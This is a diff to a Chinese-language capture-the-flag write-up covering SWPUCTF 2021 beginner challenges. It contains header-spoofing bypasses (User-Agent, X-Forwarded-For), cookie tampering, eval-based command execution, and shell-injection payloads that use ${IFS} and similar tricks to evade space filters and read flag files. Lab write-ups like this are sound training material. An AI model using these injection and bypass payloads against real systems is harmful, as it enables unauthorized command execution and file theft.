@@ -159,7 +159,6 @@ $command : 要执⾏的命令。
 需要注意的是，使⽤ system() 或其他⽤于执⾏外部命令的函数时必须⾮常⼩⼼，特别是
 当命令中包含⽤户提供的数据时。否则，你的应⽤程序将容易受到命令注⼊攻击。
 
-
 6.[SWPUCTF 2021 新生赛]caidao
 
 观察代码是一个用利用post请求的rce漏洞，eval函数导致的
@@ -172,3 +171,88 @@ $command : 要执⾏的命令。
 wllm=system("ls /");
 wllm=system("cat /flag");
 ```
+
+7.[SWPUCTF 2021 新生赛]Do_you_know_http
+
+关于http协议的题
+
+进入环境，需要我们使用WLLM浏览器访问。
+
+![1742885368676](image/NSS/1742885368676.png)
+
+所以使用burp suite抓包，从proxy模块发送到，repeater模块，将User-Agent后内容改为WLLM
+
+```
+User-Agent：WLLM
+```
+
+然后出现的结果要我们访问a.php
+
+![1742885899242](image/NSS/1742885899242.png)
+
+访问后要求在本地访问这个页面
+
+所以使用相同的方法抓包，修改客户端原始ip地址为127.0.0.1（本地)
+
+```
+X-Forwarded-For:127.0.0.1    （这个语句放在第三行左右，放在最后的话好像不起作用）
+```
+
+然后出现结果
+
+![1742886200736](image/NSS/1742886200736.png)
+
+访问./secretttt.php得到flag
+
+8.[SWPUCTF 2021 新生赛]babyrce
+
+观察代码，可以得到，我们要首先把cookie中admin的值设为1
+
+![1742888419210](image/NSS/1742888419210.png)
+
+使用hackbar或者bp抓包修改
+
+```
+Cookie:admin=1
+```
+
+![1742888703595](image/NSS/1742888703595.png)
+
+然后访问rasalghul.php
+
+![1742888802242](image/NSS/1742888802242.png)
+
+根据访问后的页面，我们可以使用get请求来修改url的值，但是代码中使用 `preg_match`函数检查 `$ip`中是否包含空格。如果检测到空格，脚本将终止执行并输出 `nonono`
+
+然后$ip中的代码将被shell_exec执行，最后由echo函数打印出来
+
+先看一下有什么东西
+
+```
+${IFS}
+$IFS$9
+可以用来在linux shell中代替空格（后面那个好像$加任何数字都可以）
+
+<
+<>
+%20
+%09
+URL编码
+
+cat,flag.php(用逗号当作空格)
+```
+
+```
+/?url=ls	   （查看当前目录下有什么）
+/?url=ls${IFS}/    (查看根目录下有什么)
+```
+
+![1742889443578](image/NSS/1742889443578.png)
+
+在根目录下看到了flag，直接拿
+
+```
+/?url=cat${IFS}/flllllaaaaaaggggggg
+```
+
+得到flag
